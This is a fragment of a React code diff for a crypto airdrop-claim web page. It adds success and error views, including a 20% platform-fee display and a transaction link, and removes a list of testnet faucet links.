+              <div className="p-3 bg-purple-500/10 rounded-lg">
+                <p className="text-purple-400/60 text-xs">Platform Fee (20%)</p>
+                <p className="text-purple-400 font-bold">{previewData?.platformFeeAmount} {previewData?.tokenSymbol}</p>
+              </div>
             </div>
+            {txHash && (
+              <a
+                href={`${selectedChain?.id === 1 ? 'https://etherscan.io' : `https://explorer.${selectedChain?.name.toLowerCase()}.com`}/tx/${txHash}`}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="block text-green-400/70 text-xs font-mono hover:text-green-400 mb-4"
+              >
+                TX: {txHash.slice(0, 20)}...
+              </a>
+            )}
+            <button
+              onClick={() => { setStep('input'); setPreviewData(null); setContractAddress('') }}
+              className="w-full py-3 bg-white/[0.05] rounded-xl text-sm hover:bg-white/[0.1]"
+            >
+              Claim Another Airdrop
+            </button>
+          </div>
+        )}
 
-            <h2 className="text-lg font-semibold mb-4">🧪 Testnet Faucets</h2>
-            <div className="grid gap-3">
-              {testnetFaucets.map((f) => (
-                <div key={f.chainId} className="p-4 bg-white/[0.02] border border-white/[0.05] rounded-xl">
-                  <div className="flex justify-between items-center">
-                    <div>
-                      <span className="font-semibold">{f.chainName}</span>
-                      <span className="text-white/30 text-sm ml-2">({f.token})</span>
-                    </div>
-                    <div className="text-right">
-                      <span className="text-blue-400 text-sm">{f.amount}</span>
-                      <span className="text-white/20 text-xs ml-2">every {f.cooldown}</span>
-                    </div>
-                  </div>
-                  <div className="mt-2 flex flex-wrap gap-2">
-                    {f.sources.map((s) => (
-                      <a
-                        key={s.name}
-                        href={s.url}
-                        target="_blank"
-                        rel="noopener noreferrer"
-                        className="px-3 py-1 bg-blue-600/20 rounded-lg text-blue-400 text-xs hover:bg-blue-600/30 transition-colors"
-                      >
-                        🚰 {s.name}
-                      </a>
-                    ))}
-                  </div>
-                </div>
-              ))}
-            </div>
+        {/* Error */}
+        {step === 'error' && (
+          <div className="p-6 bg-red-500/10 border border-red-500/20 rounded-xl">
+            <h3 className="text-red-400 font-bold text-lg mb-2">❌ Error</h3>
+            <p className="text-white/60 text-sm mb-4">{errorMsg}</p>
+            <button
+              onClick={() => { setStep('input'); setPreviewData(null) }}
+              className="px-4 py-2 bg-white/[0.05] rounded-lg text-sm hover:bg-white/[0.1]"
+            >
+              Try Again
+            </button>
           </div>
         )}
       </div>
